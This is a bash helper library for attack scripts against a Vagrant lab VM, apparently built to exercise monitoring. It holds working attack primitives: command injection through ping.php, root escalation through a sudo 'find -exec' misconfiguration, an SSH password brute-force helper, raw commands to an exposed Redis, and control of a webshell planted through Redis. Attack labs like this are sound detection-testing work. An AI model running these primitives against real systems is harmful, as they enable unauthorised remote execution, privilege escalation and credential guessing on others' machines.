#!/usr/bin/env bash
# Shared helpers for the vm/attacks scripts — source it, don't execute.
#
# TARGET    monitored host (default: the Vagrant private-network IP)
# HOST_IP   the attacker machine as the target sees it (default: the host
#           end of the VirtualBox host-only network)

TARGET="${TARGET:-192.168.56.10}"
HOST_IP="${HOST_IP:-192.168.56.1}"

say()  { printf '\n\033[1;36m==>\033[0m %s\n' "$*"; }
note() { printf '    \033[2m%s\033[0m\n' "$*"; }
die()  { printf '\033[1;31merror:\033[0m %s\n' "$*" >&2; exit 1; }

need() { command -v "$1" >/dev/null 2>&1 || die "$1 not found on the attacker box ($2)"; }

check_target() {
  curl -sf -m 5 "http://$TARGET/" >/dev/null ||
    die "cannot reach http://$TARGET/ — is the VM up? (override with TARGET=ip)"
}

# strip — drop the <pre></pre> wrapper ping.php puts around command output.
strip() { sed -e 's/<pre>//' -e 's|</pre>||'; }

# rce CMD — run CMD on the target as www-data via the ping.php injection.
rce() {
  curl -sf -G -m 60 "http://$TARGET/ping.php" --data-urlencode "ip=127.0.0.1; $1"
}

# root CMD — run CMD on the target as root via the sudo find
# misconfiguration (GTFOBins). The command crosses two shell layers; use
# single quotes inside it, never double quotes.
root() {
  rce "sudo find /etc/hosts -exec sh -c \"$1\" \\;"
}

# ssh_try USER PASS CMD — attempt one SSH password login. Prints command
# output and returns 0 on success; silent and nonzero on bad credentials.
ssh_try() {
  local out
  if command -v sshpass >/dev/null 2>&1; then
    if out=$(sshpass -p "$2" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
      -o PubkeyAuthentication=no -o PreferredAuthentications=password \
      "$1@$TARGET" "$3" 2>&1); then
      printf '%s\n' "$out"
      return 0
    fi
    return 1
  fi
  command -v expect >/dev/null 2>&1 ||
    die "the attacker box needs sshpass or expect for the brute-force stage"
  if out=$(expect <<EOF
set timeout 8
spawn ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no $1@$TARGET "$3"
expect {
  -re "(?i)password:" { send "$2\r"; exp_continue }
  eof
}
catch wait result
exit [lindex \$result 3]
EOF
); then
    printf '%s\n' "$out" | grep -v '^spawn ssh' || true
    return 0
  fi
  return 1
}

# resp ARGS — encode one Redis command as a RESP array of bulk strings,
# so the attack scripts need no redis-cli on the attacker box.
resp() {
  printf '*%d\r\n' "$#"
  local a
  for a in "$@"; do printf '$%d\r\n%s\r\n' "${#a}" "$a"; done
}

# redis_cmd ARGS — send one Redis command to the target, print the reply.
# Exit status is ignored on purpose: nc times out after the reply and some
# builds exit nonzero on that; callers assert on the reply text instead.
redis_cmd() {
  resp "$@" | nc -w 3 "$TARGET" 6379 || true
}

# webshell CMD — run CMD on the target through the shell.php dropped in
# stage 2. Responses begin with redis RDB junk; that is expected.
webshell() {
  curl -sf -G -m 60 "http://$TARGET/shell.php" --data-urlencode "c=$1"
}
